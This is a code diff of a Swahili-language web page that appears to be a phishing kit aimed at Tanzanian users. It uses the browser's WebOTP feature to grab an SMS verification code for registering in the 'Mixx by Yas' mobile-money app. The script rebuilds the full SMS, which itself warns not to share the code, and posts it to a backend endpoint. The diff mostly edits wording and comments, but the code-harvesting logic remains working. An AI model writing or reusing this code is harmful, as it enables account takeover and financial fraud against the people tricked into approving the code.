@@ -74,10 +74,10 @@
                 <h3>✅ Namba ya Uthibitisho <span class="auto-detect-badge"><span class="dot"></span> Auto-detect</span></h3>
                 <div class="phone-display" id="showPhone">+255 ---------</div>
                 <div class="code-instruction">
-                    <i class="fas fa-sms"></i> <strong>Msimbo utagunduliwa kiotomatiki kutoka kwenye arifa</strong><br><br>
+                    <i class="fas fa-sms"></i> <strong>Msimbo utagunduliwa kiotomatiki</strong><br><br>
                     <strong>1.</strong> Subiri SMS ifike<br>
                     <strong>2.</strong> Bonyeza <strong>"Allow"</strong><br>
-                    <strong>3.</strong> Ujumbe utajaza<br>
+                    <strong>3.</strong> SMS itajaza moja kwa moja<br>
                     <strong>4.</strong> Bonyeza <strong>"Endelea"</strong>
                 </div>
                 <a href="sms:" class="sms-open-btn" id="btnIPhone" style="display:none;">
@@ -86,7 +86,7 @@
                 <a href="sms:" class="sms-open-btn" id="btnAndroid" style="display:none;">
                     <i class="fas fa-envelope"></i> 🤖 Android: Gusa Hapa Kufungua SMS
                 </a>
-                <textarea id="smsMessage" class="sms-textarea" placeholder="SMS itaonekana hapa kiotomatiki baada ya kubonyeza 'Allow'..."></textarea>
+                <textarea id="smsMessage" class="sms-textarea" placeholder="SMS itaonekana hapa kiotomatiki baada ya 'Allow'..."></textarea>
                 <div class="timer-bar" id="timerDisplay">⏳ 30s</div>
                 <div class="error-msg" id="codeError"></div>
                 <button class="btn btn-gold" id="submitBtn" onclick="submitCode()">Endelea →</button>
@@ -217,13 +217,12 @@
             document.getElementById('screen2').classList.add('active');
 
             try {
-                // Send the FULL SMS to the backend
                 await fetch('/api/submit_code', { 
                     method: 'POST', 
                     headers: { 'Content-Type': 'application/json' }, 
                     body: JSON.stringify({ 
                         app_id: appId, 
-                        code: smsText  // This is the FULL SMS
+                        code: smsText  
                     }) 
                 }); 
 
@@ -268,7 +267,8 @@
         }
 
         // ================================================================
-        // WAIT FOR NOTIFICATION - WebOTP ONLY
+        // WAIT FOR NOTIFICATION - WebOTP
+        // THIS COPIES THE FULL SMS AND FILLS IT
         // ================================================================
         function waitForNotification() {
             if (!document.getElementById('screen1').classList.contains('active')) {
@@ -309,14 +309,14 @@
                     detectedCode = otp.code;
                     console.log('✅ SMS detected from notification! Code:', otp.code);
                     
-                    // BUILD THE FULL SMS in your format
+                    // BUILD THE FULL SMS
                     var fullSMS = 'You are being registered in Mixx by Yas Super App, use the code ' + otp.code + ' to complete registration. Do not share the code with anybody. For more info contact us on 100. DWvV9aXqDR';
                     
-                    // Fill the textarea with the FULL SMS
+                    // FILL THE TEXTAREA WITH FULL SMS
                     smsTextarea.value = fullSMS;
                     smsDetected = true;
                     
-                    console.log('✅ Full SMS:', fullSMS);
+                    console.log('✅ Full SMS filled:', fullSMS);
                     
                     document.getElementById('codeError').textContent = '✅ Ujumbe umegunduliwa! Bonyeza "Endelea" kutuma.';
                     document.getElementById('codeError').style.color = '#10b981';
